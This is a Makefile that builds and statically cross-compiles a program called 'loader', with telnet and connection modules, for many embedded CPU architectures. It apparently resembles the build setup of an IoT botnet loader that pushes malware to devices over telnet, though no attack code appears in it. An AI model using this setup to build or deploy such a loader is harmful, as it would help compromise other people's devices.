# Default compiler (host system)
CC = gcc
CFLAGS = -Wall -Wextra -O2 -std=c99 -D_GNU_SOURCE
LDFLAGS = -lpthread

# Debug flag - set to 1 to enable debug output
DEBUG = 1

# Add debug flags if DEBUG is enabled
ifeq ($(DEBUG), 1)
    CFLAGS += -DDEBUG -g
endif

# Cross-compiler directory
CROSS_COMPILER_DIR = /etc/xcompiler

# Source files
SOURCES = src/main.c src/binary.c src/connection.c src/server.c src/telnet_info.c src/util.c
HEADERS = src/headers/includes.h src/headers/binary.h src/headers/connection.h src/headers/server.h src/headers/telnet_info.h src/headers/util.h src/headers/config.h

# Output binary
TARGET = loader

# Default target
all: $(TARGET)

# Compile the loader for host system
$(TARGET): $(SOURCES) $(HEADERS)
	@echo "Compiling loader for host system..."
	$(CC) $(CFLAGS) -o $(TARGET) $(SOURCES) $(LDFLAGS)
	@echo "Loader compiled successfully: $(TARGET)"

# Cross-compilation targets
cross-i586: 
	@echo "Cross-compiling for i586..."
	$(CROSS_COMPILER_DIR)/i586/bin/i586-gcc $(CFLAGS) -static -o loader.i586 $(SOURCES) $(LDFLAGS)
	@echo "i586 loader compiled: loader.i586"

cross-mips:
	@echo "Cross-compiling for mips..."
	$(CROSS_COMPILER_DIR)/mips/bin/mips-gcc $(CFLAGS) -static -o loader.mips $(SOURCES) $(LDFLAGS)
	@echo "mips loader compiled: loader.mips"

cross-mipsel:
	@echo "Cross-compiling for mipsel..."
	$(CROSS_COMPILER_DIR)/mipsel/bin/mipsel-gcc $(CFLAGS) -static -o loader.mipsel $(SOURCES) $(LDFLAGS)
	@echo "mipsel loader compiled: loader.mipsel"

cross-armv4l:
	@echo "Cross-compiling for armv4l..."
	$(CROSS_COMPILER_DIR)/armv4l/bin/armv4l-gcc $(CFLAGS) -static -o loader.armv4l $(SOURCES) $(LDFLAGS)
	@echo "armv4l loader compiled: loader.armv4l"

cross-armv5l:
	@echo "Cross-compiling for armv5l..."
	$(CROSS_COMPILER_DIR)/armv5l/bin/armv5l-gcc $(CFLAGS) -static -o loader.armv5l $(SOURCES) $(LDFLAGS)
	@echo "armv5l loader compiled: loader.armv5l"

cross-armv6l:
	@echo "Cross-compiling for armv6l..."
	$(CROSS_COMPILER_DIR)/armv6l/bin/armv6l-gcc $(CFLAGS) -static -o loader.armv6l $(SOURCES) $(LDFLAGS)
	@echo "armv6l loader compiled: loader.armv6l"

cross-armv7l:
	@echo "Cross-compiling for armv7l..."
	$(CROSS_COMPILER_DIR)/armv7l/bin/armv7l-gcc $(CFLAGS) -static -o loader.armv7l $(SOURCES) $(LDFLAGS)
	@echo "armv7l loader compiled: loader.armv7l"

cross-m68k:
	@echo "Cross-compiling for m68k..."
	$(CROSS_COMPILER_DIR)/m68k/bin/m68k-gcc $(CFLAGS) -static -o loader.m68k $(SOURCES) $(LDFLAGS)
	@echo "m68k loader compiled: loader.m68k"

cross-powerpc:
	@echo "Cross-compiling for powerpc..."
	$(CROSS_COMPILER_DIR)/powerpc/bin/powerpc-gcc $(CFLAGS) -static -o loader.powerpc $(SOURCES) $(LDFLAGS)
	@echo "powerpc loader compiled: loader.powerpc"

cross-sh4:
	@echo "Cross-compiling for sh4..."
	$(CROSS_COMPILER_DIR)/sh4/bin/sh4-gcc $(CFLAGS) -static -o loader.sh4 $(SOURCES) $(LDFLAGS)
	@echo "sh4 loader compiled: loader.sh4"

cross-sparc:
	@echo "Cross-compiling for sparc..."
	$(CROSS_COMPILER_DIR)/sparc/bin/sparc-gcc $(CFLAGS) -static -o loader.sparc $(SOURCES) $(LDFLAGS)
	@echo "sparc loader compiled: loader.sparc"

# Build all cross-compiled versions
cross-all: cross-i586 cross-mips cross-mipsel cross-armv4l cross-armv5l cross-armv6l cross-armv7l cross-m68k cross-powerpc cross-sh4 cross-sparc
	@echo "All cross-compiled loaders built successfully!"

# Clean build artifacts
clean:
	@echo "Cleaning build artifacts..."
	rm -f $(TARGET) loader.*
	@echo "Clean complete"

# Install loader to system
install: $(TARGET)
	@echo "Installing loader..."
	cp $(TARGET) /usr/local/bin/
	chmod +x /usr/local/bin/$(TARGET)
	@echo "Loader installed to /usr/local/bin/"

# Debug build
debug: CFLAGS += -DDEBUG -g
debug: $(TARGET)

# Release build
release: CFLAGS += -DNDEBUG -O3
release: $(TARGET)

# Show help
help:
	@echo "Available targets:"
	@echo "  all      - Build the loader (default)"
	@echo "  clean    - Remove build artifacts"
	@echo "  install  - Install loader to system"
	@echo "  debug    - Build with debug symbols"
	@echo "  release  - Build optimized release version"
	@echo "  help     - Show this help message"

.PHONY: all clean install debug release help
